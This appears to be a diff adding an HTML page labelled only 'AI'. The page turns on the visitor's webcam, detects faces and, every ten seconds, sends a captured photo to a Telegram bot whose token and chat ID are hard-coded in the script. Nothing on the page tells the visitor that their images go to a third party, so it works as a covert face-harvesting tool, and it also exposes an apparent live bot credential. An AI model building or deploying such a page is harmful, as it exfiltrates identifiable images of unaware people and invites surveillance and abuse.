@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Auto Face Track & Forward</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clmtrackr/1.3.1/clmtrackr.min.js"></script>
+    <style>
+        body { font-family: sans-serif; background: #1a1a1a; color: white; text-align: center; }
+        #container { position: relative; width: 400px; margin: auto; }
+        video, canvas { position: absolute; left: 0; top: 0; }
+        #status { margin-top: 320px; color: #00ff00; }
+    </style>
+</head>
+<body>
+
+    <h2>AI</h2>
+    <div id="container">
+        <video id="video" width="400" height="300" preload="auto" loop playsinline autoplay></video>
+        <canvas id="overlay" width="400" height="300"></canvas>
+    </div>
+    
+    <div id="status">Waiting</div>
+
+    <script>
+        const video = document.getElementById('video');
+        const overlay = document.getElementById('overlay');
+        const status = document.getElementById('status');
+        const botToken = "8041664147:AAF8SEZD3WUzX2wLBbMzc5V4nQKStkNS_sM";
+        const chatId = "7801917150"; // You need your numerical Chat ID here!
+
+        // 1. Setup Camera
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+            video.srcObject = stream;
+        });
+
+        // 2. Setup Tracker
+        const ctrack = new clm.tracker();
+        ctrack.init();
+        ctrack.start(video);
+
+        function drawLoop() {
+            requestAnimationFrame(drawLoop);
+            const positions = ctrack.getCurrentPosition();
+            if (positions) {
+                // Face detected!
+                status.innerText = "Face Detected! Sending to Bot...";
+                captureAndSend();
+            }
+        }
+        drawLoop();
+
+        // 3. Capture Frame and Send to Telegram
+        let lastSendTime = 0;
+        function captureAndSend() {
+            const now = Date.now();
+            // Limit sending to once every 10 seconds to avoid spamming the API
+            if (now - lastSendTime < 10000) return; 
+            lastSendTime = now;
+
+            const tempCanvas = document.createElement('canvas');
+            tempCanvas.width = video.videoWidth;
+            tempCanvas.height = video.videoHeight;
+            tempCanvas.getContext('2d').drawImage(video, 0, 0);
+            
+            // Convert to Blob
+            tempCanvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'face_capture.png');
+                formData.append('caption', 'Automatic Face Tracking Capture');
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => console.log("Sent to Bot"))
+                .catch(err => console.error("Error sending:", err));
+            }, 'image/png');
+        }
+    </script>
+</body>
+</html>
